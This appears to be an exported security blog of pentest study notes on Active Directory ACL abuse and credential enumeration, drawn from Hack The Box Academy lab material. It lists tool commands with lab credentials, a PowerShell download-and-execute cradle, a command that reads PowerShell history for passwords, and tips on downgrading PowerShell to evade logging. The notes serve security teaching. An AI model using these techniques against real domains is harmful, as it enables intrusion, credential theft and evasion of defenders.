src=\"https://academy.hackthebox.com/storage/modules/143/SACL_example.png\"></p>\n<h2 id=\"Access-Control-Entries-ACEs\"><a href=\"#Access-Control-Entries-ACEs\" class=\"headerlink\" title=\"Access Control Entries (ACEs)\"></a>Access Control Entries (ACEs)</h2><p>As stated previously, Access Control Lists (ACLs) contain ACE entries that name a user or group and the level of access they have over a given securable object. There are three main types of ACEs that can be applied to all securable objects in AD:</p>\n<p>ACE\tDescription</p>\n<ul>\n<li>Access denied ACE -\tUsed within a DACL to show that a user or group is explicitly denied access to an object</li>\n<li>Access allowed ACE - Used within a DACL to show that a user or group is explicitly granted access to an object</li>\n<li>System audit ACE - Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred</li>\n</ul>\n<p>Each ACE is made up of the following four components:</p>\n<p>The <em>security identifier (SID)</em> of the user&#x2F;group that has access to the object (or principal name graphically)<br>A flag denoting the type of ACE (access denied, allowed, or system audit ACE)<br>A set of flags that specify whether or not child containers&#x2F;objects can inherit the given ACE entry from the primary or parent object<br>An access mask which is a 32-bit value that defines the rights granted to an object<br>We can view this graphically in Active Directory Users and Computers (ADUC). In the example image below, we can see the following for the ACE entry for the user forend:</p>\n<h2 id=\"Viewing-Permissions-through-Active-Directory-Users-Computers\"><a href=\"#Viewing-Permissions-through-Active-Directory-Users-Computers\" class=\"headerlink\" title=\"Viewing Permissions through Active Directory Users &amp; Computers\"></a>Viewing Permissions through Active Directory Users &amp; Computers</h2><p><img src=\"https://academy.hackthebox.com/storage/modules/143/ACE_example.png\"></p>\n<ol>\n<li>The security principal is Angela Dunn (<a href=\"mailto:&#97;&#x64;&#x75;&#x6e;&#x6e;&#x40;&#x69;&#110;&#108;&#x61;&#110;&#x65;&#x66;&#x72;&#101;&#105;&#x67;&#104;&#x74;&#x2e;&#x6c;&#111;&#x63;&#x61;&#x6c;\">&#97;&#x64;&#x75;&#x6e;&#x6e;&#x40;&#x69;&#110;&#108;&#x61;&#110;&#x65;&#x66;&#x72;&#101;&#105;&#x67;&#104;&#x74;&#x2e;&#x6c;&#111;&#x63;&#x61;&#x6c;</a>)</li>\n<li>The ACE type is Allow</li>\n<li>Inheritance applies to the “This object and all descendant objects,” meaning any child objects of the forend object would have the same permissions granted</li>\n<li>The rights granted to the object, again shown graphically in this example</li>\n</ol>\n<p>When access control lists are checked to determine permissions, they are checked from top to bottom until an access denied is found in the list.</p>\n<h2 id=\"Why-are-ACEs-Important\"><a href=\"#Why-are-ACEs-Important\" class=\"headerlink\" title=\"Why are ACEs Important?\"></a>Why are ACEs Important?</h2><p>Attackers utilize ACE entries to either further access or establish persistence. These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly. They cannot be detected by vulnerability scanning tools, and often go unchecked for many years, especially in large and complex environments. During an assessment where the client has taken care of all of the “low hanging fruit” AD flaws&#x2F;misconfigurations, ACL abuse can be a great way for us to move laterally&#x2F;vertically and even achieve full domain compromise. Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:</p>\n<ul>\n<li>ForceChangePassword abused with Set-DomainUserPassword</li>\n<li>Add Members abused with Add-DomainGroupMember</li>\n<li>GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember</li>\n<li>GenericWrite abused with Set-DomainObject</li>\n<li>WriteOwner abused with Set-DomainObjectOwner</li>\n<li>WriteDACL abused with Add-DomainObjectACL</li>\n<li>AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember</li>\n<li>Addself abused with Add-DomainGroupMember</li>\n</ul>\n<h3 id=\"enumerating-and-leveraging-four-specific-ACEs-to-highlight-the-power-of-ACL-attacks\"><a href=\"#enumerating-and-leveraging-four-specific-ACEs-to-highlight-the-power-of-ACL-attacks\" class=\"headerlink\" title=\"enumerating and leveraging four specific ACEs to highlight the power of ACL attacks:\"></a>enumerating and leveraging four specific ACEs to highlight the power of ACL attacks:</h3><ul>\n<li>ForceChangePassword - gives us the right to reset a user’s password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).</li>\n<li>GenericWrite - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.</li>\n<li>AddSelf - shows security groups that a user can add themselves to.</li>\n<li>GenericAll - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the <em>Local Administrator Password Solution (LAPS)</em> is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.</li>\n</ul>\n<p>This graphic, adapted from a graphic created by Charlie Bromberg (Shutdown), shows an excellent breakdown of the varying possible ACE attacks and the tools to perform these attacks from both Windows and Linux (if applicable). In the following few sections, we will mainly cover enumerating and performing these attacks from a Windows attack host with mentions of how these attacks could be performed from Linux. A later module specifically on ACL Attacks will go much further in-depth on each of the attacks listed in this graphic and how to perform them from Windows and Linux.</p>\n<p><img src=\"https://academy.hackthebox.com/storage/modules/143/ACL_attacks_graphic.png\"></p>\n<p>We will run into many other interesting ACEs (privileges) in Active Directory from time to time. The methodology for enumerating possible ACL attacks using tools such as BloodHound and PowerView and even built-in AD management tools should be adaptable enough to assist us whenever we encounter new privileges in the wild that we may not yet be familiar with. For example, we may import data into BloodHound and see that a user we have control over (or can potentially take over) has the rights to read the password for a Group Managed Service Account (gMSA) through the ReadGMSAPassword edge. In this case, there are tools such as GMSAPasswordReader that we could use, along with other methods, to obtain the password for the service account in question. Other times we may come across extended rights such as Unexpire-Password or Reanimate-Tombstones using PowerView and have to do a bit of research to figure out how to exploit these for our benefit. It’s worth familiarizing yourself with all of the BloodHound edges and as many Active Directory Extended Rights as possible as you never know when you may encounter a less common one during an assessment.</p>\n<h2 id=\"ACL-Attacks-in-the-Wild\"><a href=\"#ACL-Attacks-in-the-Wild\" class=\"headerlink\" title=\"ACL Attacks in the Wild\"></a>ACL Attacks in the Wild</h2><p>We can use ACL attacks for:</p>\n<ul>\n<li>Lateral movement</li>\n<li>Privilege escalation</li>\n<li>Persistence</li>\n</ul>\n<p>Some common attack scenarios may include:</p>\n<h3 id=\"Attack-Description\"><a href=\"#Attack-Description\" class=\"headerlink\" title=\"Attack Description\"></a>Attack Description</h3><table>\n<thead>\n<tr>\n<th>Attack</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Abusing forgot password permissions</td>\n<td>Help Desk and other IT users are often granted permissions to perform password resets and other privileged tasks. If we can take over an account with these privileges (or an account in a group that confers these privileges on its users), we may be able to perform a password reset for a more privileged account in the domain.</td>\n</tr>\n<tr>\n<td>Abusing group membership management</td>\n<td>It’s also common to see Help Desk and other staff that have the right to add&#x2F;remove users from a given group. It is always worth enumerating this further, as sometimes we may be able to add an account that we control into a privileged built-in AD group or a group that grants us some sort of interesting privilege.</td>\n</tr>\n<tr>\n<td>Excessive user rights</td>\n<td>We also commonly see user, computer, and group objects with excessive rights that a client is likely unaware of. This could occur after some sort of software install (Exchange, for example, adds many ACL changes into the environment at install time) or some kind of legacy or accidental configuration that gives a user unintended rights. Sometimes we may take over an account that was given certain rights out of convenience or to solve a nagging problem more quickly.</td>\n</tr>\n</tbody></table>\n<p>Note: Some ACL attacks can be considered “destructive,” such as changing a user’s password or performing other modifications within a client’s AD domain. If in doubt, it’s always best to run a given attack by our client before performing it to have written documentation of their approval in case an issue arises. We should always carefully document our attacks from start to finish and revert any changes. This data should be included in our report, but we should also highlight any changes we make clearly so that the client can go back and verify that our changes were indeed reverted properly.</p>\n","cover":false,"excerpt":"","more":"<h2 id=\"Access-Control-List-ACL-Abuse-Primer\"><a href=\"#Access-Control-List-ACL-Abuse-Primer\" class=\"headerlink\" title=\"Access Control List (ACL) Abuse Primer\"></a>Access Control List (ACL) Abuse Primer</h2><p>For security reasons, not all users and computers in an AD environment can access all objects and files. These types of permissions are controlled through Access Control Lists (ACLs). Posing a serious threat to the security posture of the domain, a slight misconfiguration to an ACL can leak permissions to other objects that do not need it.</p>\n<h2 id=\"Access-Control-List-ACL-Overview\"><a href=\"#Access-Control-List-ACL-Overview\" class=\"headerlink\" title=\"Access Control List (ACL) Overview\"></a>Access Control List (ACL) Overview</h2><p>In their simplest form, ACLs are lists that define a) who has access to which asset&#x2F;resource and b) the level of access they are provisioned. The settings themselves in an ACL are called Access Control Entries (ACEs). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD. ACLs can also be used for auditing access within AD.</p>\n<h3 id=\"There-are-two-types-of-ACLs\"><a href=\"#There-are-two-types-of-ACLs\" class=\"headerlink\" title=\"There are two types of ACLs:\"></a>There are two types of ACLs:</h3><ul>\n<li><p>Discretionary Access Control List (DACL) - defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL for the level of access that is permitted. If a DACL does not exist for an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.</p>\n</li>\n<li><p>System Access Control Lists (SACL) - allow administrators to log access attempts made to secured objects.</p>\n</li>\n</ul>\n<p>We see the ACL for the user account forend in the image below. Each item under Permission entries makes up the DACL for the user account, while the individual entries (such as Full Control or Change Password) are ACE entries showing rights granted over this user object to various users and groups.</p>\n<p>Viewing forend’s ACL</p>\n<p><img src=\"https://academy.hackthebox.com/storage/modules/143/DACL_example.png\"><br>The SACLs can be seen within the Auditing tab.</p>\n<p>Viewing the SACLs through the Auditing Tab</p>\n<p><img src=\"https://academy.hackthebox.com/storage/modules/143/SACL_example.png\"></p>\n<h2 id=\"Access-Control-Entries-ACEs\"><a href=\"#Access-Control-Entries-ACEs\" class=\"headerlink\" title=\"Access Control Entries (ACEs)\"></a>Access Control Entries (ACEs)</h2><p>As stated previously, Access Control Lists (ACLs) contain ACE entries that name a user or group and the level of access they have over a given securable object. There are three main types of ACEs that can be applied to all securable objects in AD:</p>\n<p>ACE\tDescription</p>\n<ul>\n<li>Access denied ACE -\tUsed within a DACL to show that a user or group is explicitly denied access to an object</li>\n<li>Access allowed ACE - Used within a DACL to show that a user or group is explicitly granted access to an object</li>\n<li>System audit ACE - Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred</li>\n</ul>\n<p>Each ACE is made up of the following four components:</p>\n<p>The <em>security identifier (SID)</em> of the user&#x2F;group that has access to the object (or principal name graphically)<br>A flag denoting the type of ACE (access denied, allowed, or system audit ACE)<br>A set of flags that specify whether or not child containers&#x2F;objects can inherit the given ACE entry from the primary or parent object<br>An access mask which is a 32-bit value that defines the rights granted to an object<br>We can view this graphically in Active Directory Users and Computers (ADUC). In the example image below, we can see the following for the ACE entry for the user forend:</p>\n<h2 id=\"Viewing-Permissions-through-Active-Directory-Users-Computers\"><a href=\"#Viewing-Permissions-through-Active-Directory-Users-Computers\" class=\"headerlink\" title=\"Viewing Permissions through Active Directory Users &amp; Computers\"></a>Viewing Permissions through Active Directory Users &amp; Computers</h2><p><img src=\"https://academy.hackthebox.com/storage/modules/143/ACE_example.png\"></p>\n<ol>\n<li>The security principal is Angela Dunn (<a href=\"mailto:&#97;&#x64;&#x75;&#x6e;&#x6e;&#x40;&#x69;&#110;&#108;&#x61;&#110;&#x65;&#x66;&#x72;&#101;&#105;&#x67;&#104;&#x74;&#x2e;&#x6c;&#111;&#x63;&#x61;&#x6c;\">&#97;&#x64;&#x75;&#x6e;&#x6e;&#x40;&#x69;&#110;&#108;&#x61;&#110;&#x65;&#x66;&#x72;&#101;&#105;&#x67;&#104;&#x74;&#x2e;&#x6c;&#111;&#x63;&#x61;&#x6c;</a>)</li>\n<li>The ACE type is Allow</li>\n<li>Inheritance applies to the “This object and all descendant objects,” meaning any child objects of the forend object would have the same permissions granted</li>\n<li>The rights granted to the object, again shown graphically in this example</li>\n</ol>\n<p>When access control lists are checked to determine permissions, they are checked from top to bottom until an access denied is found in the list.</p>\n<h2 id=\"Why-are-ACEs-Important\"><a href=\"#Why-are-ACEs-Important\" class=\"headerlink\" title=\"Why are ACEs Important?\"></a>Why are ACEs Important?</h2><p>Attackers utilize ACE entries to either further access or establish persistence. These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly. They cannot be detected by vulnerability scanning tools, and often go unchecked for many years, especially in large and complex environments. During an assessment where the client has taken care of all of the “low hanging fruit” AD flaws&#x2F;misconfigurations, ACL abuse can be a great way for us to move laterally&#x2F;vertically and even achieve full domain compromise. Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:</p>\n<ul>\n<li>ForceChangePassword abused with Set-DomainUserPassword</li>\n<li>Add Members abused with Add-DomainGroupMember</li>\n<li>GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember</li>\n<li>GenericWrite abused with Set-DomainObject</li>\n<li>WriteOwner abused with Set-DomainObjectOwner</li>\n<li>WriteDACL abused with Add-DomainObjectACL</li>\n<li>AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember</li>\n<li>Addself abused with Add-DomainGroupMember</li>\n</ul>\n<h3 id=\"enumerating-and-leveraging-four-specific-ACEs-to-highlight-the-power-of-ACL-attacks\"><a href=\"#enumerating-and-leveraging-four-specific-ACEs-to-highlight-the-power-of-ACL-attacks\" class=\"headerlink\" title=\"enumerating and leveraging four specific ACEs to highlight the power of ACL attacks:\"></a>enumerating and leveraging four specific ACEs to highlight the power of ACL attacks:</h3><ul>\n<li>ForceChangePassword - gives us the right to reset a user’s password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).</li>\n<li>GenericWrite - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.</li>\n<li>AddSelf - shows security groups that a user can add themselves to.</li>\n<li>GenericAll - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the <em>Local Administrator Password Solution (LAPS)</em> is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.</li>\n</ul>\n<p>This graphic, adapted from a graphic created by Charlie Bromberg (Shutdown), shows an excellent breakdown of the varying possible ACE attacks and the tools to perform these attacks from both Windows and Linux (if applicable). In the following few sections, we will mainly cover enumerating and performing these attacks from a Windows attack host with mentions of how these attacks could be performed from Linux. A later module specifically on ACL Attacks will go much further in-depth on each of the attacks listed in this graphic and how to perform them from Windows and Linux.</p>\n<p><img src=\"https://academy.hackthebox.com/storage/modules/143/ACL_attacks_graphic.png\"></p>\n<p>We will run into many other interesting ACEs (privileges) in Active Directory from time to time. The methodology for enumerating possible ACL attacks using tools such as BloodHound and PowerView and even built-in AD management tools should be adaptable enough to assist us whenever we encounter new privileges in the wild that we may not yet be familiar with. For example, we may import data into BloodHound and see that a user we have control over (or can potentially take over) has the rights to read the password for a Group Managed Service Account (gMSA) through the ReadGMSAPassword edge. In this case, there are tools such as GMSAPasswordReader that we could use, along with other methods, to obtain the password for the service account in question. Other times we may come across extended rights such as Unexpire-Password or Reanimate-Tombstones using PowerView and have to do a bit of research to figure out how to exploit these for our benefit. It’s worth familiarizing yourself with all of the BloodHound edges and as many Active Directory Extended Rights as possible as you never know when you may encounter a less common one during an assessment.</p>\n<h2 id=\"ACL-Attacks-in-the-Wild\"><a href=\"#ACL-Attacks-in-the-Wild\" class=\"headerlink\" title=\"ACL Attacks in the Wild\"></a>ACL Attacks in the Wild</h2><p>We can use ACL attacks for:</p>\n<ul>\n<li>Lateral movement</li>\n<li>Privilege escalation</li>\n<li>Persistence</li>\n</ul>\n<p>Some common attack scenarios may include:</p>\n<h3 id=\"Attack-Description\"><a href=\"#Attack-Description\" class=\"headerlink\" title=\"Attack Description\"></a>Attack Description</h3><table>\n<thead>\n<tr>\n<th>Attack</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Abusing forgot password permissions</td>\n<td>Help Desk and other IT users are often granted permissions to perform password resets and other privileged tasks. If we can take over an account with these privileges (or an account in a group that confers these privileges on its users), we may be able to perform a password reset for a more privileged account in the domain.</td>\n</tr>\n<tr>\n<td>Abusing group membership management</td>\n<td>It’s also common to see Help Desk and other staff that have the right to add&#x2F;remove users from a given group. It is always worth enumerating this further, as sometimes we may be able to add an account that we control into a privileged built-in AD group or a group that grants us some sort of interesting privilege.</td>\n</tr>\n<tr>\n<td>Excessive user rights</td>\n<td>We also commonly see user, computer, and group objects with excessive rights that a client is likely unaware of. This could occur after some sort of software install (Exchange, for example, adds many ACL changes into the environment at install time) or some kind of legacy or accidental configuration that gives a user unintended rights. Sometimes we may take over an account that was given certain rights out of convenience or to solve a nagging problem more quickly.</td>\n</tr>\n</tbody></table>\n<p>Note: Some ACL attacks can be considered “destructive,” such as changing a user’s password or performing other modifications within a client’s AD domain. If in doubt, it’s always best to run a given attack by our client before performing it to have written documentation of their approval in case an issue arises. We should always carefully document our attacks from start to finish and revert any changes. This data should be included in our report, but we should also highlight any changes we make clearly so that the client can go back and verify that our changes were indeed reverted properly.</p>\n"},{"title":"AD CRED ENUM","date":"2023-08-08T21:00:00.000Z","draft":false,"description":"Active Directory credential enumeration","top_img":"/images/cyberpunk-red.jpg","_content":"\n![](https://miro.medium.com/v2/resize:fit:750/0*Kz1iA9w7Ciywdu1A.jpg)\n\n## Credential Enumeration\n\nAfter acquiring a foothold, you must dig deeper using the low-privilege domain user credentials. Information to be interested in when enumerating:\n- Domain users\n- Computer Attributes\n- group membership\n- Group Policy Objects\n- Permissions\n- ACLs\n- Trusts\n\nbut not limited to the above, but the most **important thing to remember is that most of these tools will not work without domain users’ credentials at any permission level.**\n            \nSo at a minimum, you need to have acquired a user’s cleartext password, NTLM password hash or SYSTEM access on a domain-joined host.\n            \n## CrackMapExec.\n\nThis tool can be used to assess AD environments, where it utilizes packages from the impacket and powersploit toolkit to perform its functions.\n            \n### Domain UserEnum\n            \nWhen enumerating you need to point CME to the Domain Controller, using creds that you retrieved you can list out domain users, it is noted that CME provides a **********badPwdCount********** attribute which is helpful when performing targeted pass spraying or building a target users list filtered out with user badPwdCount attribute that’s above 0 to be careful not to lock out accounts.\n            \n`sudo crackmapexec smb xx-domain-ip-xx -u xxxxxxxx -p xxxxx --users`\n            \n### Domain Group Enum\n            \nWe can also obtain a complete listing of domain groups. We should save all of our output to files to easily access it again later for reporting or use with other tools.\n            \n`sudo crackmapexec smb xx-domain-ip-xx -u xxxxxxxx -p xxxxx`  `--groups` \n            \nWe can begin to note down groups of interest. Take note of key groups like `Administrators`, `Domain Admins`, `Executives`, any groups that may contain privileged IT admins, etc. These groups likely contain users with elevated privileges worth targeting during our assessment.\n            \n## Smbmap\n            \nA tool for enumerating SMB shares from a Linux environment can be used to list shares, permissions and share content. \n            \n### recursive list Dirs in Shares\n            \n`smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only`\n            \n## RpcClient\n            \nUsed to enumerate, add, change and even remove objects from AD.\n            \n### Enumeration \n            \n[Relative Identifier (RID)](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) is a unique identifier utilized to track and identify objects, for example:\n            \n- The [SID](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) for the INLANEFREIGHT.LOCAL domain is: `S-1-5-21-3842939050-3880317879-2865463114`.\n\n- When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.\n\n- So the domain user `htb-student` with a RID:[0x457] Hex 0x457 would = decimal `1111`, will have a full user SID of `S-1-5-21-3842939050-3880317879-2865463114-1111`.\n\n- This is unique to the `htb-student` object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.\n            \nSome accounts will have the same RID regardless of what host you are on, built-in admin accounts for domains will have **500** or **0x1f4** this value is unique to an object hence we can use it to enumerate further info from the domain.\n            \n## Impacket-Toolkit\n\nimpacket is a versatile toolkit which gives different ways to enumerate, interact and exploit Windows protocols and find the information needed using Python. \n            \n### Psexec.py\n            \nA clone of sysinternals psexec executable works by creating a remote service by uploading a randomly-named executable to the ADMIN$ shares on the target host and registers the service via RPC and the Windows services control manager.\n            \nOnce comms are established it provides a shell as a SYSTEM on the victim host.\n            \n### windapsearch\n            \n[Windapsearch](https://github.com/ropnop/windapsearch) is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries, we can also perform standard enumeration (dumping users, computers, and groups) and more detailed enumeration. The `--da`(enumerate domain admins group members ) option and the `-PU`( find privileged users) options. The `-PU` option is interesting because it will perform a recursive search for users with nested group membership.\n            \n### Domain-Admins\n            \n`python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da`\n            \nThis enumerates Domain Admin Groups.\n            \n### Privileged Users\n            \nChecking for potential users, using **-PU** with elevated privileges that may have gone unnoticed.\n            \n**N/B This is a great check for reporting since it will most likely inform the customer of users with excess privileges from nested group membership.**\n            \n`python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU`\n            \n## BloodHound\n            \nOnce you have the domain credentials, you can run [BloodHound.py](https://github.com/fox-it/BloodHound.py) a tool for auditing Active Directory where it takes large amounts of data that would be time-consuming to sift through and create a GUI representation or “attack paths” of where access with a particular user may lead.\n            \n- ### Windows\n        \nAt this point, we are interested in other misconfiguration and permission issues that could lead to lateral and vertical movement, getting the bigger picture of how the domain is setup\n        \n- Do any trusts exist with other domains both inside & outside the current forest?\n- Files shares that our user has access to.\n\n## ActiveDirectory Powershell Modules\n\nThese are groups of Powershell cmdlets for enumerating AD environments.\n        \n`Get-ADDomain` - Print out domain SID, domain functional level, and child domains.\n        \n`Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName` This will filter ACC with the **serviceprincipalname** property populated and also get us a listing ACC that may be susceptible to kerberos attacks.\n        \n`Get-ADTrust -Filter *` - prints out any trust relationship the domain has, it’s useful when looking at how to take advantage of the child-to-parent trust relationship and attack across forest trusts.\n        \n`Get-ADGroup -Filter * | select name` - Group enumeration\n        \n`Get-ADGroup -Identity \"Backup Operators\"` - Detailed Group Info\n        \n`Get-ADGroupMember -Identity \"Backup Operators\"` - Getting Group Membership\n        \n## Powerview\n        \nIt identifies where users are logged in on a network, enumerates domain info such as users, computers, groups, ACLs, and trusts, hunts for file shares and passwords, performs Kerberoasting and more.\n        \nIt gives an insight into the security posture of the target domain. \n        \n- ### commands\n          \n            \n| Command | Description |\n| --- | --- |\nExport-PowerViewCSV | Append results to a CSV file |\nConvertTo-SID | Convert a User or group name to its SID value \n| Get-DomainSPNTicket | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account |\n**Domain/LDAP Functions**\n| Get-Domain | Will return the AD object for the current (or specified) domain |\n| Get-DomainController | Return a list of the Domain Controllers for the specified domain |\n| Get-DomainUser | Will return all users or specific user objects in AD |\n Get-DomainComputer | Will return all computers or specific computer objects in AD |\n| Get-DomainGroup | Will return all groups or specific group objects in AD |\n| Get-DomainOU | Search for all or specific OU objects in AD |\n Find-InterestingDomainAcl | Finds object ACLs in the domain with modification rights set to non-built in objects |\n| Get-DomainGroupMember | Will return the members of a specific domain group |\n| Get-DomainFileServer | Returns a list of servers likely functioning as file servers |\n| Get-DomainDFSShare | Returns a list of all distributed file systems for the current (or specified) domain |\n| GPO Functions: |  |\n| Get-DomainGPO | Will return all GPOs or specific GPO objects in AD |\n| Get-DomainPolicy | Returns the default domain policy or the domain controller policy for the current domain |\n| **Computer Enumeration Functions**: \n| Get-NetLocalGroup | Enumerates local groups on the local or a remote machine |\n| Get-NetLocalGroupMember | Enumerates members of a specific local group |\nGet-NetShare | Returns open shares on the local (or a remote) machine |\n| Get-NetSession | Will return session information for the local (or a remote) machine |\n| Test-AdminAccess | Tests if the current user has administrative access to the local (or a remote) machine |\n**Threaded 'Meta'-Functions**\n| Find-DomainUserLocation | Finds machines where specific users are logged in |\n| Find-DomainShare | Finds reachable shares on domain machines |\n| Find-InterestingDomainShareFile | Searches for files matching specific criteria on readable shares in the domain |\n| Find-LocalAdminAccess | Find machines on the local domain where the current user has local administrator access |\n| **Domain Trust Functions** |  |\n| Get-DomainTrust | Returns domain trusts for the current domain or a specified domain |\n| Get-ForestTrust | Returns all forest trusts for the current forest or a specified forest |\n| Get-DomainForeignUser | Enumerates users who are in groups outside of the user's domain |\n| Get-DomainForeignGroupMember | Enumerates groups with users outside of the group's domain and returns each foreign member |\n| Get-DomainTrustMapping | Will enumerate all trusts for the current domain and any others seen. |\n        \n**Domain User Info**        \n\n`Get-DomainUser -Identity morgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname, description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol`\n        \n******Recursive Group Membership******\n        \n`Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse` - retrieve group-specific information and recurse which means if it finds any groups that are part of the target group (******nested group membership******) to list out the members of those groups.\n        \n************************************Trust Enumeration.************************************\n        \n`Get-DomainTrustMapping` test for local admin access on either the current machine or the remote one.\n        \n**********************************Testing for Local Admin Access********************************** \n        \n`Test-AdminAccess -ComputerName ACADEMY-EA-MS01`\n        \n********************************Users with SPN Set********************************\n        \n`Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName`\n        \n## Shares\n        \nAllows users on the domain to quickly access info relevant to their daily roles and share content with their organization. \n        \n### Snaffler\n        \n A tool that helps in acquiring credentials or other sensitive data in AD, works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories.\n        \n## Living off the Land\n    \nDiscussion on Techniques for utilizing native Windows tools to perform our enumeration is considered a more stealthy approach and may not create as many log entries and alerts as pulling tools into the network.\n    \nMost enterprise environments have network monitoring and logging, including IDS/IPS, firewalls and passive sensors and tools on top of their host-based defences Windows Defender or enterprise EDR.\n    \n### Env Enumeration Host & Network Recon\n    \n| Command | Result |\n| --- | --- |\n| hostname | Prints the PC's Name |\n| [System.Environment]::OSVersion.Version | Prints out the OS version and revision level |\n| wmic qfe get Caption,Description,HotFixID,InstalledOn | Prints the patches and hotfixes applied to the host |\n| ipconfig /all | Prints out network adapter state and configurations |\n| set %USERDOMAIN% | Displays the domain name to which the host belongs (ran from CMD-prompt) |\n| set %logonserver% | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |\n    \n## Powershell\n    \nIt provides an extensive framework for administering all facets of Windows systems and AD Environments, can be used to dig deep into systems and can be used on engagements to recon the host and network and send and receive files.\n    \n| Cmd-Let | Description |\n| --- | --- |\n| Get-Module | Lists available modules loaded for use. |\n| Get-ExecutionPolicy -List | Will print the https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2 settings for each scope on a host. |\n| Set-ExecutionPolicy Bypass -Scope Process | This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |\n| Get-Content C:\\Users\\<USERNAME>\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. |\n| Get-ChildItem Env: | ft Key, Value | Return environment values such as key paths, users, computer information, etc. |\n| powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>\" | This is a quick and easy way to download a file from the web using PowerShell and call it from memory. |\n    \n## OPSec Tactics\n    \nA few Operational security tactics that defenders are unaware of are that several versions of Powershell often exist on a host. If not uninstalled, they can still be used.\n    \n### Example\n    \n> Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while utilizing resources built into the hosts to our advantage.\n\n### Checking Defenses.\n    \nThese few commands will utilize the [netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) and [sc](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query) to help get an understanding of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.\n    \nFirewall check - `netsh advfirewall show allprofiles`\n    \nDefender check cmd - `sc query windefend`\n    \nChecking the status and configuration settings - `Get-MpComputerStatus`\n    \n## Am I Alone?\n    \nWhen landing on a host for the first time, it's important to check and see if you are the only one logged in since if you take certain actions from a host someone else is logged on, there is potential for them to identify you.\n    \nIf a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.\n    \n### Network Enumeration\n            \n| Networking Commands | Description |\n| --- | --- |\n| arp -a | Lists all known hosts stored in the arp table. |\n| ipconfig /all | Prints out adapter settings for the host. We can figure out the network segment from here. |\n| route print | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |\n| netsh advfirewall shows state | Displays the status of the host's firewall. We can determine if it is active and filtering traffic. |\n    \n### Windows Management Instrumentation (WMI)\n\n This scripting engine is used within Windows enterprises to retrieve info and run admin tasks on local and remote hosts.\n    \n**Quick 